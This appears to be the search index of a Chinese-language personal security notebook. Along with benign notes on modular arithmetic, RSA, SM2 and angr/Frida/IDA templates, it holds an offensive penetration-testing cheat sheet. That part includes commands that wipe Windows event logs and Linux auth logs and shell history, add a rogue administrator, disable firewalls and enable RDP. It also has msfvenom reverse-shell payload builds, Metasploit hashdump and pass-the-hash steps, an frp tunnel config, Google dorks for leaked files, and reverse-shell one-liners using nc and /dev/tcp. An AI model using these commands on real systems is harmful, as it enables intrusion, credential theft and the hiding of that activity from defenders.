{"./":{"url":"./","title":"Introduction","keywords":"","body":"Introduction "},"密码/对称加密.html":{"url":"密码/对称加密.html","title":"对称加密","keywords":"","body":"对称加密 加密模式 ECB电码本模式 CBC密文分组链接 CFB密文反馈模式 OFB输出反馈模式 "},"密码/模运算.html":{"url":"密码/模运算.html","title":"模运算","keywords":"","body":"运算规则 四则运算 (a + b) % p = (a % p + b % p) % p （1） (a – b) % p = (a % p – b % p) % p （2） (a * b) % p = (a % p * b % p) % p （3） (a ^ b) % p = ((a % p) ^ b) % p （4） 结合律 ((a+b) % p + c) % p = (a + (b+c) % p) % p （5） ((a*b) % p * c)% p = (a * (b*c) % p) % p （6） 交换律 (a + b) % p = (b+a) % p （7） (a * b) % p = (b * a) % p （8） 分配律 ((a +b)% p * c) % p = ((a * c) % p + (b * c) % p) % p 重要定理 若a≡b (% p)，则对于任意的c，都有(a + c) ≡ (b + c) (%p) 若a≡b (% p)，则对于任意的c，都有(a * c) ≡ (b * c) (%p) 若a≡b (% p)，c≡d (% p)，则 (a + c) ≡ (b + d) (%p)，(a – c) ≡ (b – d) (%p)， (a * c) ≡ (b * d) (%p)，(a / c) ≡ (b / d) (%p) "},"密码/RSA.html":{"url":"密码/RSA.html","title":"RSA","keywords":"","body":"RSA 内容从互联网收集，有问题联系我删除。 本文归纳理解RSA需要掌握的理论知识。 数论基础 互质关系 如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。比如，15和32没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。 1. 任意两个质数构成互质关系，比如13和61。 2. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。 3. 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。 4. 1和任意一个自然数是都是互质关系，比如1和99。 5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。 6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。 欧拉函数 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？（比如，在1到8之中，有多少个数与8构成互质关系？） 计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。φ(n) 的计算方法并不复杂，但是为了得到最后那个公式，需要一步步讨论。 通用公式 其中 是 的所有不重复的素因子。 特例情况 情况1 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。 情况2 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 情况3 如果 p 为素数，n 是 p 的正整数次方，那么 φ(n) = φ(p^k) = p^k (1-p^-1) 情况4 如果n可以分解成两个互质的整数之积， 　　n = p1 × p2 则 　　 v = φ(p1p2) = φ(p1)φ(p2) 即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。 欧拉定理 ​ 如果正整数n和整数a互质，那么就有（φ(n)是欧拉函数）: 最大公约数gcd、最小公倍数lcm 同余 同余定理：给定一个正整数m，如果两个整数a和b满足a-b能够被m整除，即(a-b)/m得到一个整数，那么就称整数a与b对模m同余，记作a≡b(mod m)。对模m同余是整数的一个等价关系。 费马小定理 模反元 如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。 这时，b就叫做a的\"模反元素\"。 RSA的e、d推导过程 第一步，随机选择两个不相等的质数p和q。 第二步，计算p和q的乘积n。 第三步，计算n的欧拉函数φ(n)。 第四步，随机选择一个整数e，条件是1"},"密码/SM2.html":{"url":"密码/SM2.html","title":"SM 2","keywords":"","body":"SM2算法 所有信息来源于互联网，如果有侵犯您权利，请联系我删除 SM2属于ECC（椭圆曲线加密算法），它由椭圆曲线方程式y^2=x^3+ax+b (mod p)描述，不同的椭圆曲线参数会产生不同的曲线。我国经复杂的数学推理证明定义了一组椭圆曲线参数，并命名为SM2。注意SM2定义的加解密过程和签名过程与ECC由差别，详见《GMT 0003.2-2012 SM2椭圆曲线公钥密码算法第2部分：数字签名算法》、《GMT 0003.4-2012 SM2椭圆曲线公钥密码算法第4部分：公钥加密算法》 ECC标准加解密过程 sequenceDiagram Alice->>Alice: 约定曲线参数sm2p256v1,选取G点、随机数k（私钥）计算公钥：K=kG Alice->>Bob: 发送K、G Bob->>Bob: 将明文映射到约定的椭圆曲线上（点M）, 生成随机数r，计算C1=M+rK；C2=rG Bob->>Alice: 发送C1、C2 Alice->>Alice: 计算C1-kC2 = M+rK - k(rG) = M + rk - r(kG) = M Alice->>Alice: 恢复M到明文 数学基础 定义：曲线上任意两点的连线延长做一条直线，这条直线与曲线有一个交点，根据椭圆曲线的对称性，我们做这个交点的x轴对称，得一个新的点，该点仍在曲线上，这个过程，我们叫打点，即dot。 ​ 我们来看上图，A dot B得到的是C点。（很多文献把这个过程定义成椭圆曲线的加法），我们持续这一过程反复 A dot B=C A dot C=D A dot D=E ​ 重复这一过程，我们来看看结果，我们发现了一些特性，如果图像无限大的话，打点这一过程可以一直持续。也就是说，我们可一直打点，我们假设进行了无数次的打点，并得到其中一点G，如果我们只知道G和A，那么G点是A打点几次得出的？我想这是一个很难的数学问题。 结论 在给定起始点A和终点G的情况下，我们想找出打点次数n的值是很困难的。正推容易，反推很难，这就是ECC算法的单向函数，也是ECC算法的数学基础。 上一节加密过程中G为起点（参数固定公开），k即为打点次数（随机，私钥），K=kG为最终的打点（公钥），由K、G很难推导出k。 ECC签名过程 签名定义 Sig=Fsig(Fhash(m),dA) - dA是私钥 - m是待签名信息 - Fhash是哈希函数 - Fsig是签名算法 - Sig是签名结果 - Sig = (R,S) 签名过程 1. 生成随机数k，作为临时私钥 2. 临时公钥P = k*G 3. R是P的x坐标 4. S = k-1(Hash(m) + dA * R) mod p - k是步骤1中的临时私钥 - R是步骤2中临时公钥的x坐标值 - dA是私钥 - m是带签名数据 - p是椭圆曲线的素数阶 [公钥生成方法见这篇文章](https://mp.csdn.net/mdeditor/83268791#) 验证签名过程 验证签名是生成签名的反过程，使用R,S和公钥计算P P = S-1 * Hash(m) * G + S-1 * R * Qa - R和S是签名值 - Qa是签名私钥对应的公钥 - m是源数据 - G是椭圆曲线的预置生成点 如果最终计算出来P和R是相等的，那么签名通过 SM2 加解密过程 加密 在A1步骤中，需要注意不能使用C语言中简单的随机数函数，因为这里 k 是一个很大的数字，有32字节，在GmSSL是用 BIGNUM 结构来表示的。在一般网络库中都会定义这种大整数类型，也会提供了随机函数发生器。 在A2步骤中，一般实现了ECC算法的网络库都实现了 [k]G 这种运算，找到使用即可。将C1转化为比特串，需要考虑CPU大小端的问题，通常网络库有现成的函数。 在A3步骤中，刚开始看文档没明白 h 值是什么，后来才理解到这就是曲线参数的 cofactor，而且这个步骤主要是验证公钥PB的有效性，略过也没问题。 在A5步骤中，有个KDF函数需要实现。KDF函数的流程如下，其中的Hv函数请使用SM3： A7步骤的Hash也采用SM3 在最后拼接 C1 || C3 || C2 步骤，并不是把这些字节拼接起来就完事，我吃过大亏。因为在解密步骤中，还需要用到 x1、y1、C3、C2这几个参数，如果拼接成一个bit串，接收方如何拆分？如果我们内部使用，当然可以根据它们各自的长度（对于指定SM2曲线和SM3哈希算法，x1, y1, C3的长度是固定的）来拆分，但这样不够灵活，万一换了命名曲线或哈希算法呢？在文档中没有找到说明，但我研究了GmSSL的源码，才弄明白要采用ASN.1 DER编码，这样接受方就可以通过DER解码，分别拿到x1、y1、C3、C2参数值。关于DER编码解码，请参考相关的资料，一般网络库都会提供DER编解码的函数，我们只要调用就可以了。 最后这一步，要是只看这份文档，就会掉进一个大坑。我在本地实现了SM2的加密和解密，使用 《GMT 0003.4-2012》文档附录中的数据进行测试，也都通过，但在与第三方服务器端对接时，总是解密失败，后来才发现是因为这个原因。 解密 SM2 签名解签名过程 签名 解签名 "},"逆向/技巧汇总.html":{"url":"逆向/技巧汇总.html","title":"技巧汇总","keywords":"","body":"技巧汇总 x64dbg与ida加载地址保持一致 Window 删除PE文件的ASLR功能 将`IMAGE_OPTIONAL_HEADER\\DllCharacteristic`中的`IMAGE_DLLCHARACTERISTICS_DYNAMIC`字段值去掉即可：将PE中8140数据改为8100。 Linux echo 0 >/proc/sys/kernel/randomize_va_space "},"逆向/angr.html":{"url":"逆向/angr.html","title":"Angr","keywords":"","body":"Angr 模版 通用 import angr def main(): p = angr.Project(\"ch23.bin\") # 创建一个Angr工程,可以追加参数：load_options={\"auto_load_libs\": False} # auto_load_libs 设置是否自动载入依赖的库，如果设置为 True 的话会自动载入依赖的库 # 然后分析到库函数调用时也会进入库函数，这样会增加分析的工作量，也有能会跑挂 state = p.factory.entry_state(add_options=angr.options.unicorn) # 获取入口函数，也可以指定某个地址 sm = p.factory.simgr(state) # 在入口准备开始符号执行 sm.explore(find=0x00008634, avoid=[0x00008644, 0x000084E8]) # 遍历可能的路径并找到成功的那条路径 # 最终想找到的路径是0x804868B，要避开的路径是0x804869E，这里可以写多个avoid，用[] print(sm.found[0].posix.dumps(0)) # 返回当前状态输入 dumps(0)表示输入 if __name__ == '__main__': main() 注意 还可以设置 angr 的选项，使用 unicorn 引擎来做模拟执行 p = angr.Project(xxx’) #对于 c++ 的程序，如果调用了 c++ 的函数，使用 full_init_state state = p.factory.full_init_state(add_options=angr.options.unicorn) #state = p.factory.entry_state(add_options=angr.options.unicorn) "},"逆向/frida.html":{"url":"逆向/frida.html","title":"Frida","keywords":"","body":"Frida 模版 Sample console.log(\"Script loaded successfully \"); //so Hook var str_name_so = \"liblibdroid.so\"; //要hook的so名 var n_addr_func_offset = 0xa10; //要hook的函数在函数里面的偏移 //加载到内存后 函数地址 = so地址 + 函数偏移 var n_addr_so = Module.findBaseAddress(str_name_so); var n_addr_func = parseInt(n_addr_so, 16) + n_addr_func_offset; var ptr_func = new NativePointer(n_addr_func); var pAddr = null; Interceptor.attach(ptr_func, { onEnter: function (args) { //onEnter: 进入该函数前要执行的代码，其中args是传入的参数 //一般so层函数第一个参数都是JniEnv，第二个参数是jclass，从第三个参数开始是我们java层传入的参数 // console.log(\"Hook start src \",toByte(args[3])); // console.log(\"Hook start dst\",toByte(args[2])); pAddr = args[2]; }, onLeave: function (retval) { //onLeave: 该函数执行结束要执行的代码，其中retval参数即是返回值 var a = Uint8ArrayToString(java2jsByte(pAddr)); if (a.indexOf(\"Congratulations!\") >= 0) { console.log(\"hit\", a); } // send(\"return:\"+retval); //返回值 // retval.replace(100); //替换返回值为100 } }); //java Hook Java.perform(function x() { console.log(\"Inside Java perform\"); var m = Java.use(\"ctf.stratumauhhur.libdroid.a\"); //a被多个重载，通过overload //public void ctf.stratumauhhur.libdroid.a.a(android.view.View) m.a.overload('android.view.View').implementation = function (view) { var dst = [-2, -96, -83, -128, 32, 89, -85, 18, -41, -61, -100, -120, -6, 44, 29, -4, -127, 70, 13, -36, -23, -50, -52, 87, 120, -11, 65, 95, 82, 2, 54, -43, 51, 24, 102, 58, 64, 38, -24, 110, -74, -51, 114, -73, 60, 1, 102, -79, 79, -103, 35, 99, -107, 119, 52, 97, 105, -10, -87, 83, 64, 55, 65, 67, 79, -104, -107, 44, 122, 39, 60, -104, 104, 26, -120, -88, -73, -123, -69, 21, 79, 26, 1, 77, -55, -56, -101, 117, 120, 87, 127, -104, 13, -40, 81, -88, 34, -71, 94, 89, 77, 113, 79, 26, -127, -87, -65, 7, 41, -19, -3, -125]; var tmp = []; var result = java2jsByte(m.f.value) console.log(\"start cracking...\") //var source = m.d.value; var source = \"1 3875\" var pin = source; var test = []; for (var j = 0; j "},"逆向/idc.html":{"url":"逆向/idc.html","title":"Idc","keywords":"","body":"IDA.idc sample 打印地址 #include static main() { auto start = 0x08049155; auto length= 0x19; auto i; for (i=0; i "},"渗透/渗透.html":{"url":"渗透/渗透.html","title":"渗透","keywords":"","body":"攻击链 工具链 Tips: github下载加速 https://ghproxy.com/https://github.com/xxx https://github.com/b1gcat/DarkEye https://github.com/shadow1ng/fscan https://github.com/OJ/gobuster https://github.com/shmilylty/OneForAll https://github.com/EnableSecurity/wafw00f https://github.com/danielmiessler/SecLists "},"渗透/痕迹清理.html":{"url":"渗透/痕迹清理.html","title":"痕迹清理","keywords":"","body":"痕迹清理 Windows wevtutil cl system 清理系统日志 wevtutil cl application 清理应用程序日志 wevtutil cl security 清理安全日志 Linux echo > /var/log/btmp echo > /var/log/wtmp echo > /var/log/lastlog echo > /var/log/secure echo > /var/log/audit/audit.log echo \"\" > ~/.bash_history history -c "},"渗透/内网技巧.html":{"url":"渗透/内网技巧.html","title":"内网技巧","keywords":"","body":"内网技巧 下载 Windows certutil -urlcache -split -f http://fuck/nc.exe 查找 Windows # 查找index.html或index.*的文件 for /r d:/ %i in (index.html) do @echo %i for /r d:/ %i in (index.*) do @echo %i # 从*.html或*.*中查找内容 findstr /s/i/n /d:D:\\sec_tools\\ /c:\"html\" *.html findstr /s/i/n /d:C:\\windows\\ /c:\"success\" *.* # 找到文件后将hwhw2.txt内容写入目标，并将目标重命名为xxx.jsp for /r \"f:\\\" %i in (2020112601719755*) do @type hwhw2.txt > %i.jsp 添加用户 Window # 添加 net user hwhwhw2021 12345678Xx@321 /add net localgroup administrators hwhwhw2021 /add # 删除 net user hwhwhw2021 /del Linux 略 内网探测简易版 # Windows for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I \\| findstr \"TTL=\" # Linux for i in {1..254}; do ping 192.168.1.$i -c 1 -w 1|grep ttl; done 域控 # 查域控主机 ipconfig /all #Window IP 配置中找 `主DNS后缀` 如果是这个样子wtf.xxx 尝试ping wtf.xxx可以出主控主机地址 或 dsquery server && net time /domain # 获取域控器主机名 net group \"domain controllers\" /domain # 获取域控管理员 net group \"domain admins\" /domain # 获取域内计算机 这个步骤可能出现6118错误，要想其它办法了 net view /domain:XX # 查询域站点 dsquery site # 获取hash值 todo: # 利用hash登录其它主机 use exploit/windows/smb/psexec set rhosts wonima set smbuser administrator set smbpass xxx:ooo IIS站点查询 C:\\Windows\\System32\\inetsrv\\appcmd list site C:\\Windows\\System32\\inetsrv\\appcmd list vdir 关闭防火墙 Windows server 2003系统及以前版本，命令如下： netsh firewall set opmode disable Windows server 2003之后系统版本，命令如下： netsh advfirewall set allprofiles state off 开3389服务 # 查远程桌面端口 REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /V PortNumber # win2003 wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 # win2008+ wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (__CLASS !=\"\") call setallowtsconnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1 reg add \"HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f "},"渗透/搜索技巧.html":{"url":"渗透/搜索技巧.html","title":"搜索技巧","keywords":"","body":"Google Hacking 常用GoogleHacking语法 1、intext：（仅针对Google有效）把网页中的正文内容中的某个字符作为搜索的条件 2、intitle：把网页标题中的某个字符作为搜索的条件 3、cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息 4、filetype/ext：指定一个格式类型的文件作为搜索对象 5、inurl：搜索包含指定字符的URL 6、site：在指定的(域名)站点搜索相关内容 其他GoogleHacking语法 1、引号 '' \"把关键字打上引号后，把引号部分作为整体来搜索 2、or同时搜索两个或更多的关键字 3、link搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL 4、info查找指定站点的一些基本信息 GoogleHacking典型用法 管理后台地址 site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录 上传类漏洞地址 site:target.com inurl:filesite:target.com inurl:upload 注入页面 site:target.com inurl:php?id= 编辑器页面 site:target.com inurl:ewebeditor 目录遍历漏洞 site:target.com intitle:index.of SQL错误 site:target.com intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:”Warning: mysql_query()\" | intext:”Warning: pg_connect()\" phpinfo() site:target.com ext:php intitle:phpinfo \"published by the PHP Group\" 配置文件泄露 site:target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini 数据库文件泄露 site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露 site:target.com ext:.log 备份和历史文件泄露 site:target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar 公开文件泄露 site:target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv 邮箱信息 site:target.com intext:@target.com site:target.com 邮件 site:target.com email 社工信息 site:target.com intitle:账号 | 密码 | 工号 | 学号 | 身份证 "},"渗透/msf.html":{"url":"渗透/msf.html","title":"Msf","keywords":"","body":"MSF 一条龙 Payload制作 Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT=12306 -f elf > shell.elf msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST= LPORT=12306 -f elf > shell.elf Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=12306 -f exe > meinv.exe msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=12306 -f exe > meinv.exe Mac msfvenom -p osx/x64/shell_reverse_tcp LHOST= LPORT=12306-f macho > shell.machoWeb PHP msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT=12306 -f raw > shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=12306 -f asp > shell.asp JSP msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=12306 -f raw > shell.jsp WAR msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT=12306 -f war > shell.war Python msfvenom -p cmd/unix/reverse_python LHOST= LPORT=12306 -f raw > shell.py Bash msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=12306 -f raw > shell.sh Perl msfvenom -p cmd/unix/reverse_perl LHOST= LPORT=12306 -f raw > shell.pl 技巧 msfvenom -l payloads #查看支持的payloads -i 10 #生成payload带上-i 10表示对payload编码10次 反弹设置 #全局设置代理，似乎没手感 不推荐 #set proxies socks5:127.0.0.1:8080 #Payload值根据实际使用的payload填写 set exitonsession false use exploits/multi/handler set PAYLOAD windows/x64/meterpreter/reverse_tcp set LHOST VPSIP set LPORT 12307 exploit -j #获取session后设置路由 run post/multi/manage/autoroute #获取各种hashdump（search），未知密码情况下hashdump可以用来横向登录其它主机 run post/windows/gather/hashdump 或 run post/windows/gather/smart_hashdump #代理设置 感觉没有frp好用 use auxiliary/server/socks_proxy #只是临时想看下内网服务可以做端口映射，很快、稳、也方便。 meterpreter > portfwd add -l 14448 -r 172.16.200.6 -p 3389 #设置好后根据前面的msf路由可以打攻击流量，跨网段的还是用proxychain启动msf打比较稳。 use auxiliary/scanner/smb/smb_ms17_010 set RHOSTS 10.20.100.201 exploit 代理设置 代理服务frp frpc [common] #remote vps addr server_addr = vpsip server_port = 64447 tls_enable = true pool_count = 5 [plugin_socks] type = tcp remote_port = 54321 plugin = socks5 use_encryption = true frps [common] bind_addr = 0.0.0.0 bind_port = 64447 dashboard_port = 7500 dashboard_user = admin1 代理服务reGeorg 参见Readme 代理客户端 proxychain4 #配置proxychain的代理连上frp，端口为54321 proxychain4 msfconsole 浏览器 # 配置参数参考 sock5 ip vps port 54321 # 注意 谷歌浏览器不支持带密码的sock5 其它 #简易版反连 # Linux vul机器 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc IP 4444 >/tmp/f 或 bash -i >& /dev/tcp/IP/4444 0>&1 # Window vul机器 nc ip 4444 -e c:\\windows\\system32\\cmd.exe #反弹机器 nc -lvp 4444 "}}